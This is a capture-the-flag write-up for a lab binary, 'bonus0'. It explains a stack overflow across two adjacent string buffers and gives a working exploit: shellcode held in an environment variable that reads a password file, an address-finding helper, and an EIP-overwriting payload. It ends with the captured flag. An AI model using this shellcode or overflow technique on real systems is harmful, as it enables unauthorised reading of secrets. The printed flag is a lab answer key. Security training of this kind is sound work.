# Write up

Now you know how it works, small test of the program, dissassembling, translating and commenting.
The program here let us write 2 strings and display them, separated by a space.
Main calls a `pp` function before the puts call on the same stack address.
`pp` calls `p` 2 times, with a different stack offset. (See the pseudo_code.c file)
Writing 20 char in the first string overflows on the second string.
To write on the two strings at the same time with user input, we can use two python strings in once : `(python -c 'print "a" * 20'; python -c 'print "b" * 20') | ./bonus0`
Considering that with a 20 char long first buffer we each second buffer char is stored twice, we have to pad 14 chars in order to overwrite a 4-byte saved eip (20 + 28 + 4 + 1 (space) : 53 chars, one char after the payload address is mandatory to reach 54).
Same trick than the level9's one :
```
export LIDLCODE=$(python -c 'print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/user/bonus1/.pass"')
echo 'void main(){printf("%p\n", getenv("LIDLCODE"));}' > /tmp/lidl9.c; gcc /tmp/lidl9.c -o /tmp/lidl9; chmod 777 /tmp/lidl9; /tmp/lidl9 // 0xbfffff94 here
(python -c 'print "a" * 20'; python -c 'print "b" * 14 + "\x94\xff\xff\xbf" + "b"'; cat) | ./bonus0
 -
 -
aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbi���b bbbbbbbbbbbbbbi���b
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

## Sources

https://reverseengineering.stackexchange.com/questions/2774/what-does-the-assembly-instruction-repne-scas-byte-ptr-esedi
http://shell-storm.org/shellcode/files/shellcode-73.php